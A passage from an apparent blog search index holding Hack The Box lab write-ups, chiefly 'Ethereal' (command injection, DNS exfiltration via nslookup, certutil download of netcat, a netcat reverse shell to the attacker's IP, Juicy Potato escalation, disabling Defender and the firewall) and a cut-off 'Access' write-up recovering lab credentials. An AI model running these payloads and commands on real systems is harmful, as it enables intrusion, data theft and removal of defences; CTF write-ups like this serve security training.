lslsroot.txt  secretdata.txtroot@carrier:~# cat root.txtcat root.txt2832e..."
  },
  
  {
    "title": "Ethereal - Hack The Box",
    "url": "/posts/htb-writeup-ethereal/",
    "categories": "hackthebox, infosec",
    "tags": "ms-dos, dns exfiltration, command injection, rotten potato, unintended, efs",
    "date": "2019-03-09 00:00:00 +0800",
    





    
    "snippet": "Ethereal was a really difficult box from MinatoTW and egre55 that I solved using an unintended priv esc method with Rotten Potato. The box was patched soon after the release to block that priv esc ...",
    "content": "Ethereal was a really difficult box from MinatoTW and egre55 that I solved using an unintended priv esc method with Rotten Potato. The box was patched soon after the release to block that priv esc route. The box had some trivial command injection in the Test Connection page but since pretty much everything was blocked outbound I had to use DNS exfiltration to get the output from my commands. Once I got SYSTEM access via Potato, I found user.txt and root.txt were encrypted and couldn’t be read as NT AUTHORITY\\SYSTEM. At that point, I’ve spent a lot of hours on this box and I just wanted to get the flags so I changed both users’s password and RDP’ed in and was able to see the flags.Quick summary  Find the MS-DOS password manager file FDISK.zip on the FTP server  Run Dosbox, downloading missing dependies for pbox.exe, retrieve passwords after guessing the secret key  Find the command injection vulnerability on the “Ping” page  Use command injection vulnerability to scan open outbound ports, find TCP ports 73 and 136  Use certutil.exe to download nc.exe on the box, get a shell as user IIS  Use certutil.exe to download Juicy Potato on the box, get a shell as SYSTEM  Disable Windows Defender &amp; Windows Firewall  Change passwords for users jorge and rupal, then RDP into the box to get both user.txt and root.txt flagsDetailed stepsPortscanroot@darkisland:~/hackthebox/Machines/Ethereal# nmap -sC -sV -oA ethereal 10.10.10.106Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-08 13:35 EDTNmap scan report for ethereal.htb (10.10.10.106)Host is up (0.10s latency).Not shown: 997 filtered portsPORT     STATE SERVICE VERSION21/tcp   open  ftp     Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106| ftp-syst: |_  SYST: Windows_NT80/tcp   open  http    Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Ethereal8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  Basic realm=ethereal.htb|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.65 secondsFTP enumerationAnonymous access is allowed on the FTP server.root@darkisland:~/hackthebox/Machines/Ethereal# ftp 10.10.10.106Connected to 10.10.10.106.220 Microsoft FTP ServiceName (10.10.10.106:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.07-10-18  10:03PM       &lt;DIR&gt;          binaries09-02-09  09:58AM                 4122 CHIPSET.txt01-12-03  09:58AM              1173879 DISK1.zip01-22-11  09:58AM               182396 edb143en.exe01-18-11  12:05PM                98302 FDISK.zip07-10-18  09:59PM       &lt;DIR&gt;          New folder07-10-18  10:38PM       &lt;DIR&gt;          New folder (2)07-09-18  10:23PM       &lt;DIR&gt;          subversion-1.10.011-12-16  09:58AM                 4126 teamcity-server-log4j.xml226 Transfer complete.We’ll download all the files to our Kali box so it’s easier to look at files:root@darkisland:~/hackthebox/Machines/Ethereal# wget -r --no-passive ftp://10.10.10.106--2018-10-08 13:38:09--  ftp://10.10.10.106/           =&gt; ‘10.10.10.106/.listing’Connecting to 10.10.10.106:21... connected.Password managerThere’s a lot of files on the FTP, the interesting one is FDISK.zip.First, we’ll unzip it and determine it’s a FAT filesystem.root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# unzip FDISK.zip Archive:  FDISK.zip  inflating: FDISKroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file FDISKFDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"MSDOS5.0\", root entries 224, sectors 2880 (volumes &lt;=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x5843af55, unlabeled, FAT (12 bit), followed by FATAfter mounting it, we found there’s an MS-DOS executable pbox.exe file in there.root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# mount -t vfat -o loop FDISK /mntroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnttotal 1drwxr-xr-x 2 root root 512 Jul  2 19:16 pboxroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnt/pboxtotal 80-rwxr-xr-x 1 root root   284 Jul  2 19:05 pbox.dat-rwxr-xr-x 1 root root 81384 Aug 25  2010 pbox.exeroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file /mnt/pbox/pbox.exe/mnt/pbox/pbox.exe: MS-DOS executable, COFF for MS-DOS, DJGPP go32 DOS extender, UPX compressedTo run this, we’ll use dosbox and mount the Kali directory inside MS-DOS.root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# cd /mnt/pbox/root@darkisland:/mnt/pbox# dosboxDOSBox version 0.74-2Copyright 2002-2018 DOSBox Team, published under GNU GPL.---CONFIG:Loading primary settings from config file /root/.dosbox/dosbox-0.74-2.confMIXER:Got different values from SDL: freq 44100, blocksize 512ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)MIDI:Opened device:noneWe are missing a dependency to be able to run pbox.exeAfter a bit of googling, I found the missing dependency:root@darkisland:/mnt/pbox# wget http://teadrinker.net/tdold/mr/cwsdpmi.zip--2018-10-08 13:47:19--  http://teadrinker.net/tdold/mr/cwsdpmi.zipResolving teadrinker.net (teadrinker.net)... 46.30.213.33, 2a02:2350:5:100:c840:0:24b2:20fbConnecting to teadrinker.net (teadrinker.net)|46.30.213.33|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 16799 (16K) [application/zip]Saving to: ‘cwsdpmi.zip’cwsdpmi.zip               100%[=====================================&gt;]  16.41K  --.-KB/s    in 0.1s    2018-10-08 13:47:20 (125 KB/s) - ‘cwsdpmi.zip’ saved [16799/16799]root@darkisland:/mnt/pbox# unzip cwsdpmi.zip Archive:  cwsdpmi.zip  inflating: CWSDPMI.EXENow we can run the password manager, but it asks for a password.The password is easily guessed: password, we now have access to all the passwords.Found multiple credentials; the only one that is useful is: !C414m17y57r1k3s4g41n!Web enumerationThere’s a ton of useless crap and decoys on this box, notably:  Fake desktop with a troll face &amp; flag  Fake members login pageThere’s an administration page at http://ethereal.htb:8080/We can log in with:  username: alan  password: !C414m17y57r1k3s4g41n!Note: We can guess the username since the name Alan is mentionned in the notes and in some of the password manager entriesCommand injection using ping pageWe can run commands by adding &amp;&amp; &lt;command&gt; in the command field.We can validate we got RCE by pinging ourselves with 127.0.0.1 &amp;&amp; ping 10.10.14.23.The first IP is implicitely pinged by the script followed by our injected command after &amp;&amp;:root@darkisland:~/hackthebox/Machines/Ethereal# tcpdump -nni tun0 icmptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on tun0, link-type RAW (Raw IP), capture size 262144 bytes14:30:51.029999 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 39, length 4014:30:51.030129 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 39, length 4014:30:52.046783 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 40, length 4014:30:52.046814 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 40, length 40We can’t run any other commands like certutil.exe or powershell.exe, AppLocker is probably enabled on the box.However we can exfil some data by using nslookup.For example, using the payload 127.0.0.1 &amp;&amp; nslookup inject 10.10.14.23, we get can get the box to do a query back to us:root@darkisland:~# tcpdump -nni tun0 -vv port 53tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes20:20:16.625986 IP (tos 0x0, ttl 127, id 8724, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.52125 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:20:18.652075 IP (tos 0x0, ttl 127, id 8726, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.52126 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? inject. (24)20:20:20.922359 IP (tos 0x0, ttl 127, id 8727, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.52127 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? inject. (24)What we want is to exfil the output of commands, by using the following payload we can start to output some stuff:FOR /F \"tokens=1\" %g IN 'whoami' do (nslookup %g 10.10.14.23)Output:20:30:23.082437 IP (tos 0x0, ttl 127, id 8942, offset 0, flags [none], proto UDP (17), length 58)    10.10.10.106.63713 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? etherealalan. (30)Now, it’s not perfect, we can’t exfil special characters or anything else that is not a valid character in a DNS query. So in the query above, we can guess that the real output should be ethereal\\alan instead of etherealalan.So if we’re listing directories, we have to use the /b flag so it only returns the name of the directory/file otherwise we’ll need to play with the token parameter to indicate which item to read from the output.Another example listing directories: FOR /F \"tokens=1\" %g IN 'dir /b c:\\users' do (nslookup %g 10.10.14.23)20:35:04.531929 IP (tos 0x0, ttl 127, id 9016, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53805 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:06.823075 IP (tos 0x0, ttl 127, id 9017, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53806 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:08.851451 IP (tos 0x0, ttl 127, id 9018, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53807 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:10.839111 IP (tos 0x0, ttl 127, id 9019, offset 0, flags [none], proto UDP (17), length 59)    10.10.10.106.53808 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? Administrator. (31)20:35:12.854740 IP (tos 0x0, ttl 127, id 9020, offset 0, flags [none], proto UDP (17), length 59)    10.10.10.106.53809 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? Administrator. (31)20:35:14.895892 IP (tos 0x0, ttl 127, id 9021, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53810 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:16.886216 IP (tos 0x0, ttl 127, id 9022, offset 0, flags [none], proto UDP (17), length 50)    10.10.10.106.53811 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? alan. (22)20:35:19.474240 IP (tos 0x0, ttl 127, id 9023, offset 0, flags [none], proto UDP (17), length 50)    10.10.10.106.53812 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? alan. (22)20:35:21.312568 IP (tos 0x0, ttl 127, id 9025, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.56757 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:23.309541 IP (tos 0x0, ttl 127, id 9028, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.56758 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? jorge. (23)20:35:25.299775 IP (tos 0x0, ttl 127, id 9029, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.56759 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? jorge. (23)20:35:27.338241 IP (tos 0x0, ttl 127, id 9031, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.56760 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:29.355372 IP (tos 0x0, ttl 127, id 9032, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.56761 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? Public. (24)20:35:31.523795 IP (tos 0x0, ttl 127, id 9034, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.56762 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? Public. (24)20:35:33.646114 IP (tos 0x0, ttl 127, id 9035, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.56763 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:35.669198 IP (tos 0x0, ttl 127, id 9038, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.58924 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? rupal. (23)20:35:37.681147 IP (tos 0x0, ttl 127, id 9040, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.58925 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? rupal. (23)We just listed c:\\users and found the following directories:  c:\\users\\Administrator  c:\\users\\alan  c:\\users\\jorge  c:\\users\\rupalDoing things manually takes a long time so I started working on a python script to automate the process. Overcast [Blog] was also working on the box and was one step ahead of me. He shared with me a script he had already created.#!/usr/bin/python3from socket import *from requests_futures.sessions import FuturesSessionimport timeimport selects = socket(AF_INET, SOCK_DGRAM)s.settimeout(10)s.bind(('10.10.14.23', 53))def recv():    print(\"[+] Receiving data:\")    try:        while True:            data = s.recv(1024)            if data[1] == 2: # A record                print(data[13:-5])    except Exception as e:        print(e)        print(\"[!] Done\")        returndef send(cmd, col):    session = FuturesSession()    session.post(\"http://ethereal.htb/p1ng/\", data=            {                \"__VIEWSTATE\": \"/wEPDwULLTE0OTYxODU3NjhkZD0G/ny1VOoO1IFda8cKvyAZexSk+Y22QbXBRP0gxbre\",                \"__VIEWSTATEGENERATOR\": \"A7095145\",                \"__EVENTVALIDATION\": \"/wEdAAOZvFNfMAAnpqKRCMR2SHn/4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN/siIFmy9ZoaWu7BT0ak0x7Uttp88efMu6vUQ1geHQSWQ==\",                \"search\": f\"127.0.0.1 &amp;&amp; FOR /F \\\"tokens={col}\\\" %g IN ('{cmd}') do (nslookup %g 10.10.14.23)\",                \"ctl02\": \"\"            },            proxies={\"http\": \"127.0.0.1:8080\"})def shell():    while 1:        cmd = input(\"$&gt; \")        if cmd == \"exit\":            s.close()            exit()        else:            col = input(\"(col#)&gt; \")            if col == '':                col = 1            else:                col = int(col)            send(cmd, col)            recv()if __name__ == '__main__':    shell()We still need to mess with the token parameter when we have output with spaces in it, but it make things but more manageable.whoamiroot@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_alan.py $&gt; whoami(col#)&gt; [+] Receiving data:b'etherealalan'dir c:\\users\\alan$&gt; dir /b c:\\users\\alan(col#)&gt; [+] Receiving data:b'Contacts'b'Desktop'b'Documents'b'Downloads'b'Favorites'b'Links'b'Music'b'Pictures'b'Saved'b'Searches'b'Videos'dir c:\\users\\alan\\desktop$&gt; dir /b c:\\users\\alan\\desktop(col#)&gt; [+] Receiving data:b'note-draft\\x03txt'Too bad, there’s no flag… let’s keeping looking.dir c:\\inetpub\\wwwroot$&gt; dir /b c:\\inetpub\\wwwroot(col#)&gt; [+] Receiving data:b'corp'b'default\\x04aspx'b'p1ng'timed outInteresting, there’s a directory p1ng, let’s check check it out:Wow, so we didn’t even need the credentials from the password manager have we known this hidden path.I got really stuck at this point and spent the next several hours trying to find ways to get a proper shell, or find hidden files that would allow me to get unstuck. I didn’t get far until at some point after I had switched the path invoked by the script to use the unauthenticated page on port 80, I realized that the whoami output I was now getting was different.root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_iis.py $&gt; whoami(col#)&gt; [+] Receiving data:b'iis'Ok, so the webserver on port 80 is not running with the same user as port 8080.After wasting a few more hours, I realized that AppLocker isn’t enabled for user IIS. I suspected that the outbound ports on the box would be firewalled so I used a boolean blind approach to test various commands. The following payload will ping my machine only if the preceding command has been successfully executed: 127.0.0.1 &amp;&amp; whoami &amp;&amp; ping 10.10.14.23.To test this, I first tried a command that I know will work: 127.0.0.1 &amp;&amp; whoami &amp;&amp; ping 10.10.14.23root@darkisland:~# tcpdump -nni tun0 icmptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on tun0, link-type RAW (Raw IP), capture size 262144 bytes21:02:19.817657 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 63, length 4021:02:19.817712 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 63, length 4021:02:20.777578 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 64, length 4021:02:20.777608 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 64, length 4021:02:21.768882 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 65, length 4021:02:21.768933 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 65, length 4021:02:22.919376 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 66, length 4021:02:22.919408 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 66, length 40We are getting pinged so it means the command was executed correctly.Next, our target is certutil.exe so we can use it to download files.First, I tested locally on my Windows machine if running certutil.exe without parameters returns a successful error code. I wanted to do this because I suspected there was an outbound firewall blocking some most ports.Then I verified that certutil.exe is not blocked now that we are running as IIS: 127.0.0.1 &amp;&amp; certutil.exe &amp;&amp; ping 10.10.14.23.21:06:30.214884 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 71, length 4021:06:30.214912 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 71, length 4021:06:31.286151 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 72, length 4021:06:31.286182 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 72, length 40We’re getting pinged so the certutil.exe command didn’t error out.While previously looking at the files and programs on the box, I found c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" installed (and it wasn’t AppLocked for alan user either), so I used this to establish outbound sockets.I modified the existing script to scan for the first 200 ports:    for i in range(1, 200):        time.sleep(2.5)        cmd = \"\\\"c:\\\\program files (x86)\\\\OpenSSL-v1.1.0\\\\bin\\\\openssl.exe\\\" s_client -host 10.10.14.23 -port {}\".format(str(i))        print(cmd)        send(cmd, 1)I used Wireshark to look for incoming SYN packets and started the scan.root@darkisland:~/hackthebox/Machines/Ethereal# ./scanport.py[...]\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 72\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 73\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 74\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 75[...]\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 135\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 136\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 137\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 138From the pcap, I identified inbound connections on port 73 and 136.Now, we just need to get netcat uploaded to the server and try to get a proper shell.First, let’s start an HTTP listener on port 73 to host nc.exe, then issue certutil.exe -urlcache -split -f http://10.10.14.23:73/nc.exe c:\\users\\public\\desktop\\shortcuts\\nc.exeAnd finally, spawn a netcat connection with c:\\users\\public\\desktop\\shortcuts\\nc.exe -e cmd.exe 10.10.14.23 136We finally got a shell!PrivescOur IIS user has SeImpersonatePrivilege so we can probably do Rotten Potato.c:\\windows\\system32\\inetsrv&gt;whoamiiis apppool\\defaultapppoolc:\\windows\\system32\\inetsrv&gt;whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                               State============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token             DisabledSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        DisabledSeAuditPrivilege              Generate security audits                  DisabledSeChangeNotifyPrivilege       Bypass traverse checking                  EnabledSeImpersonatePrivilege        Impersonate a client after authentication EnabledSeCreateGlobalPrivilege       Create global objects                     EnabledSeIncreaseWorkingSetPrivilege Increase a process working set            DisabledI used Juicy Potato from Decoder.c:\\windows\\system32\\inetsrv&gt;cd \\users\\public cd \\users\\publicc:\\Users\\Public&gt;cmd /c certutil.exe -urlcache -split -f http://10.10.14.23:73/JuicyPotato.exe JuicyPotato.exe10/10/2018  02:40 AM    &lt;DIR&gt;          .10/10/2018  02:40 AM    &lt;DIR&gt;          ..06/25/2018  03:51 PM    &lt;DIR&gt;          Documents07/03/2018  10:25 PM    &lt;DIR&gt;          Downloads10/10/2018  02:40 AM           347,648 JuicyPotato.exe07/16/2016  02:23 PM    &lt;DIR&gt;          Music07/16/2016  02:23 PM    &lt;DIR&gt;          Pictures07/16/2016  02:23 PM    &lt;DIR&gt;          VideosExecute it, spawning yet another netcat:c:\\Users\\Public&gt;JuicyPotato -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\users\\public\\desktop\\shortcuts\\nc.exe -e cmd.exe 10.10.14.23 73\" -t *JuicyPotato -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\users\\public\\desktop\\shortcuts\\nc.exe -e cmd.exe 10.10.14.23 73\" -t *                                                                                Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337......[+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKc:\\Users\\Public&gt;We got a shell as nt authority\\system!root@darkisland:~/hackthebox/Machines/Ethereal# nc -lvnp 73listening on [any] 73 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.106] 49877Microsoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemC:\\Windows\\system32&gt;Strange… we don’t have read access to the flags even though we are SYSTEM:C:\\Windows\\system32&gt;cd \\users\\jorge\\desktopcd \\users\\jorge\\desktopC:\\Users\\jorge\\Desktop&gt;dirdir Volume in drive C has no label. Volume Serial Number is FAD9-1FD5 Directory of C:\\Users\\jorge\\Desktop07/08/2018  11:20 PM    &lt;DIR&gt;          .07/08/2018  11:20 PM    &lt;DIR&gt;          ..07/04/2018  10:18 PM                32 user.txt               1 File(s)             32 bytes               2 Dir(s)  15,231,598,592 bytes freeC:\\Users\\jorge\\Desktop&gt;type user.txttype user.txtAccess is denied.Looking at the flags, we see that the file is encrypted:PS C:\\users\\jorge\\desktop&gt; get-itemproperty -path user.txt  | Format-list -Property *get-itemproperty -path user.txt  | Format-list -Property *PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\jorge\\deskto                    p\\user.txtPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\jorge\\deskto                    pPSChildName       : user.txt[...]Attributes        : Archive, EncryptedSame thing for the root.txt file in c:\\users\\rupal\\desktop\\root.txtI found some cert and private key files on the D: drivePS D:\\certs&gt; dir    Directory: D:\\certsMode                LastWriteTime         Length Name                          ----                -------------         ------ ----                          -a----         7/1/2018  10:26 PM            772 MyCA.cer                      -a----         7/1/2018  10:26 PM           1196 MyCA.pvkI thought of googling for ways to recover EFS encrypted files but instead I just YOLOed it:Attack plan:  Disable Windows Defender  Disable Firewall  Change Rupal and Jorge’s passwords  RDP in and steal their shitPS C:\\&gt; Set-MpPreference -DisableRealtimeMonitoring $truePS C:\\&gt; NetSh Advfirewall set allprofiles state offOk.PS C:\\&gt; net users rupal Yoloed1234!net users rupal Yoloed1234!The command completed successfully.PS C:\\&gt; net users jorge Yoloed1234!net users jorge Yoloed1234!The command completed successfully.Sweet, RDP is already running, no need to enable it:PS C:\\&gt; netstat -an                netstat -an                                                           Active Connections                                                      Proto  Local Address          Foreign Address        State  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENINGAt last, we can RDP and get the flags!!"
  },
  
  {
    "title": "Access - Hack The Box",
    "url": "/posts/htb-writeup-access/",
    "categories": "hackthebox, infosec",
    "tags": "telnet, windows, access, outlook, credential manager",
    "date": "2019-03-02 00:00:00 +0800",
    





    
    "snippet": "Access was a quick and fun box where we had to look for credentials in an Access database then use the credentials to decrypt a PST file. Kali Linux has some tools that let us read those two file t...",
    "content": "Access was a quick and fun box where we had to look for credentials in an Access database then use the credentials to decrypt a PST file. Kali Linux has some tools that let us read those two file types without having to spin up a Windows VM. The box creator was kind enough to open up telnet so once we got the low privilege user credentials from the mailbox file we could log on and find the administrator credentials in the Windows Credential Manager.Quick summary  There’s an encrypted zip file on the FTP server along with a .mdb Access DB backup  The password for the zip file is contained in the backup file  The zip file contains a .PST file with another set of credentials in an email  The credentials give access to Windows through the telnet service  The Windows administrator credentials are stored in Windows Credentials ManagerTools/Blogs used  mdbtools  readpstDetailed stepsPortscanNot many ports open for a Windows box.root@darkisland:~# nmap -F 10.10.10.98Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-30 18:24 EDTNmap scan report for access.htb (10.10.10.98)Host is up (0.018s latency).Not shown: 97 filtered portsPORT   STATE SERVICE21/tcp open  ftp23/tcp open  telnet80/tcp open  httpFTPThe FTP site allows anonymous access and there’s two interesting files we can download:  backup.mdb  Access Control.ziproot@darkisland:~/hackthebox/Machines/Access# ftp 10.10.10.98Connected to 10.10.10.98.220 Microsoft FTP ServiceName (10.10.10.98:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.08-23-18  09:16PM       &lt;DIR&gt;          Backups08-24-18  10:00PM       &lt;DIR&gt;          Engineer226 Transfer complete.ftp&gt; cd Backups250 CWD command successful.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.08-23-18  09:16PM              5652480 backup.mdb226 Transfer complete.ftp&gt; type binary200 Type set to I.ftp&gt; get backup.mdblocal: backup.mdb remote: backup.mdb200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.5652480 bytes received in 0.94 secs (5.7248 MB/s)ftp&gt; cd ..250 CWD command successful.ftp&gt; cd Engineer250 CWD command successful.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.08-24-18  01:16AM                10870 Access Control.zip226 Transfer complete.ftp&gt; get \"Access Control.zip\"local: Access Control.zip remote: Access Control.zip200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.10870 bytes received in 0.05 secs (200.3631 kB/s)Finding a password in the Access databaseWe can use mdbtools to view the Access database file:root@darkisland:~/hackthebox/Machines/Access# mdb-tables -1 backup.mdb | grep -i authauth_group_permissionsauth_messageauth_permissionauth_userauth_user_groupsauth_user_user_permissionsauth_groupAUTHDEVICEWe can issue SQL queries with the mdb-sql tool and look for credentials in the auth_user table:root@darkisland:~/hackthebox/Machines/Access# mdb-sql -p backup.mdb 1 =&gt; select * from auth_user2 =&gt; goid\tusername\tpassword\tStatus\tlast_login\tRoleID\tRemark25\tadmin\tadmin\t1\t08/23/18 21:11:47\t26\t27\tengineer\taccess4u@security\t1\t08/23/18 21:13:36\t26\t28\tbackup_admin\tadmin\t1\t08/23/18 21:14:02\t26\t3 Rows retrievedFound the following credentials:  engineer / access4u@securityFinding credentials in PST fileUnzipping the encrypted zip file with password access4u@security:root@darkisland:~/hackthebox/Machines/Access# 7z e access.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)Scanning the drive for archives:1 file, 10870 bytes (11 KiB)Extracting archive: access.zip--Path = access.zipType = zipPhysical Size = 10870    Enter password (will not be echoed):Everything is Ok         Size:       271360Compressed: 10870We can read the PST file content with readpst and it’ll create an mbox file:root@darkisland:~/hackthebox/Machines/Access# readpst access.pstOpening PST file and indexes...Processing Folder \"Deleted Items\"\t\"Access Control\" - 2 items done, 0 items skipped.root@darkisland:~/hackthebox/Machines/Access# ls -ltotal 5820-rw-r--r-- 1 root root    3112 Sep 30 18:36 'Access Control.mbox'Looking in the mbox file we find an email with another set of credentials:root@darkisland:~/hackthebox/Machines/Access# cat 'Access Control.mbox'From \"john@megacorp.com\" Thu Aug 23 19:44:07 2018Status: ROFrom: john@megacorp.com &lt;john@megacorp.com&gt;Subject: MegaCorp Access Control System \"security\" accountTo: 'security@accesscontrolsystems.com'[...]Hi there,The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.Regards,JohnFound the following credentials:  security / 4Cc3ssC0ntr0llerGetting a shellTelnet is enabled on this box so we can use that last set of credentials and log in to the server:root@darkisland:~/hackthebox/Machines/Access# telnet 10.10.10.98Trying 10.10.10.98...Connected to 10.10.10.98.Escape character is '^]'.Welcome to Microsoft Telnet Service login: securitypassword: 4Cc3ssC0ntr0ller*===============================================================Microsoft Telnet 